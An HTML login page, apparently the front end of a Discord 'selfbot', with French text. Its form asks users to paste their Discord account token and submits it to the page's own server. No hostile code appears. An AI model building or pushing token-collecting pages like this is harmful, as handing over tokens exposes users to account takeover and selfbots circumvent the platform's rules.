<!DOCTYPE html>
<html>
<head>
    <title>Selfbot Login</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: #2b2d31;
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #313338;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            width: 300px;
            text-align: center;
        }
        h2 { margin-bottom: 20px; color: #fff; }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #1e1f22;
            border: none;
            color: #fff;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #5865F2;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.2s;
        }
        button:hover { background-color: #4752c4; }
        .disclaimer { font-size: 12px; color: #949ba4; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Connexion Selfbot</h2>
        <form method="POST">
            <input type="text" name="token" placeholder="Votre Token Discord" required autocomplete="off">
            <button type="submit">Lancer le Bot</button>
        </form>
        <p class="disclaimer">Entrez votre token pour démarrer votre session.</p>
    </div>
</body>
</html>
